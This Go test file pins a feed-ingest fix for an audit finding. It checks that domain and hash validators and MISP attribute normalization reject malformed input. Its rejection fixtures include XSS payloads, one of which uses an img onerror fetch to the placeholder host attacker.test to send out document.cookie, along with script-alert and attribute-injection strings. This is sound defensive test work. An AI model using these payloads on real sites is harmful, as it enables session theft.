package feeds

import "testing"

// TestValidDomain_AcceptsRealDomains exercises the shape control NEW-28
// added at the feed-ingest boundary. The audit's exploit chain
// depended on a malicious "domain" indicator like
//
//	<img src=x onerror=fetch('//attacker.test')>
//
// surviving normalization. Any reasonable domain regex rejects that
// shape; the tests below pin both the rejections (HTML metacharacters,
// control characters, empty, too-long) and the acceptances (real
// domains, SRV-style records with leading underscores) so a future
// regex tweak doesn't accidentally re-open the path.
func TestValidDomain_AcceptsRealDomains(t *testing.T) {
	for _, d := range []string{
		"example.com",
		"sub.example.com",
		"deep.subdomain.example.co.uk",
		"_dmarc.example.com",
		"_acme-challenge.example.com",
		"xn--n3h.example.com", // punycode
		"EXAMPLE.COM",         // uppercase
		"example.com.",        // trailing dot (absolute form)
		"a.io",                // 2-char TLD
	} {
		if !validDomain(d) {
			t.Errorf("validDomain(%q) = false; want true", d)
		}
	}
}

func TestValidDomain_RejectsMaliciousAndMalformed(t *testing.T) {
	for _, d := range []string{
		"",
		"<img src=x onerror=fetch('//attacker.test')>",
		"<script>alert(1)</script>",
		"javascript:alert(1)",
		"example.com<script>",
		"example.com\x00",
		"example.com\nattacker.test",
		"example.com onerror=foo",
		`example.com"onmouseover="alert(1)`,
		"example.com/path",
		"example",      // single label
		".example.com", // leading dot
		"example..com", // empty label
		"example.com-", // trailing hyphen
		"-example.com", // leading hyphen on label
		"example.123",  // numeric TLD
		"a.b",          // 1-char TLD
	} {
		if validDomain(d) {
			t.Errorf("validDomain(%q) = true; want false", d)
		}
	}

	// Length cap.
	long := ""
	for i := 0; i < 30; i++ {
		long += "abcdefghi."
	}
	long += "com" // > 253 chars
	if validDomain(long) {
		t.Errorf("validDomain(254+ chars) = true; want false")
	}
}

func TestValidHash_AcceptsCanonicalLengths(t *testing.T) {
	cases := []struct {
		name string
		in   string
	}{
		{"MD5 lower", "d41d8cd98f00b204e9800998ecf8427e"},
		{"MD5 upper", "D41D8CD98F00B204E9800998ECF8427E"},
		{"SHA1", "da39a3ee5e6b4b0d3255bfef95601890afd80709"},
		{"SHA256", "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"},
		{"SHA512", "cf83e1357eefb8bdf1542850d66d8007d620e4050b5715dc83f4a921d36ce9ce47d0d13c5d85f2b0ff8318d2877eec2f63b931bd47417a81a538327af927da3e"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			if !validHash(c.in) {
				t.Errorf("validHash(%q) = false; want true", c.in)
			}
		})
	}
}

func TestValidHash_RejectsBadShapes(t *testing.T) {
	for _, h := range []string{
		"",
		"not-a-hash",
		"d41d8cd98f00b204e9800998ecf8427",      // 31 chars
		"d41d8cd98f00b204e9800998ecf8427eX",    // contains non-hex
		"<script>alert(1)</script>",            // length not in {32,40,64,128}
		"d41d8cd9 8f00b204e9800998ecf8427e",    // contains space
		"d41d8cd9-8f00-b204-e980-0998ecf8427e", // contains hyphen
	} {
		if validHash(h) {
			t.Errorf("validHash(%q) = true; want false", h)
		}
	}
}

// TestNormalizeMISPAttribute_RejectsMaliciousDomain locks in the
// upstream half of the NEW-28 fix — the audit's exploit needed a
// malicious-shape "domain" attribute to survive normalization, and
// post-fix it doesn't.
func TestNormalizeMISPAttribute_RejectsMaliciousDomain(t *testing.T) {
	a := mispAttribute{
		ID:    "1",
		Type:  "domain",
		Value: "<img src=x onerror=fetch('//attacker.test/'+document.cookie)>",
	}
	if _, ok := normalizeMISPAttribute(a); ok {
		t.Error("malicious-shape domain attribute survived normalizeMISPAttribute")
	}
}

func TestNormalizeMISPAttribute_RejectsMalformedHash(t *testing.T) {
	a := mispAttribute{
		ID:    "1",
		Type:  "md5",
		Value: "<script>alert(1)</script>",
	}
	if _, ok := normalizeMISPAttribute(a); ok {
		t.Error("malicious-shape hash attribute survived normalizeMISPAttribute")
	}
}
